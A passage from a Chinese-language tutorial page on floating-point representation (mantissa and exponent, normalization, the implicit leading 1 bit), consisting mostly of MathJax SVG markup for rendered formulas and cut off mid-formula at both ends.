388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container></span>
都是整数（可能为负数）。这种表示方式的一个特点是，它的<strong>分布非常不均匀</strong>——在区间
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.778ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2111.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 内的数与 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.669ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3389.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(1222.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2000.7,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g><g data-mml-node="mo" transform="translate(3000.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 内的数的数量大致相同。</p>
<p>这里的定义是m作为小数点后的尾数，并且这是因为浮点数的表示并<strong>不是唯一的</strong>。例如，数字
1 可以表示为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="28.833ex" height="2.185ex" role="img" focusable="false" viewBox="0 -883.9 12744.4 965.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(1722.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,413) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(2936.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3992.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(4714.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(5715,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7479.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(8535.2,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(10257.5,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(11257.7,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g></g></g></g></svg></mjx-container></span>
同样的数可以有<strong>多种不同的表示方式</strong>，在某些应用（如<strong>比较或哈希计算</strong>）中，这可能会带来问题。为了解决这个问题，我们可以使用<strong>标准化（Normalization）</strong>，即强制遵循某种约定。在十进制中，我们通常把小数点放在第一个非零数字之后（如<strong>6.022e23</strong>），在二进制中，我们也可以做类似的标准化：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="28.229ex" height="2.339ex" role="img" focusable="false" viewBox="0 -883.9 12477.2 1033.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1277.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2333.6,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2500,0)"></path></g><g data-mml-node="mn" transform="translate(3033,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6047.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(7103.7,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2278,0)"></path></g><g data-mml-node="mn" transform="translate(2811,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(10540.4,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(11540.7,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,413) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></svg></mjx-container></span> 观察这个表示方式后，我们发现二进制数的<strong>最高位始终是
1</strong>。这意味着我们<strong>不需要显式存储这一位</strong>，只需要存储剩下的部分，即一个介于
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.778ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2111.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
之间的数。这样，我们的可表示数的集合变成了： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.629ex;" xmlns="http://www.w3.org/2000/svg" width="38.931ex" height="4.158ex" role="img" focusable="false" viewBox="0 -1118 17207.6 1837.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="B1" d="M56 320T56 333T70 353H369V502Q369 651 371 655Q376 666 388 666Q402 666 405 654T409 596V500V353H707Q722 345 722 333Q722 320 707 313H409V40H707Q722 32 722 20T707 0H70Q56 7 56 20T70 40H369V313H70Q56 320 56 333Z"></path></g><g data-mml-node="mo" transform="translate(1278,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2389.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3389.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4267.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 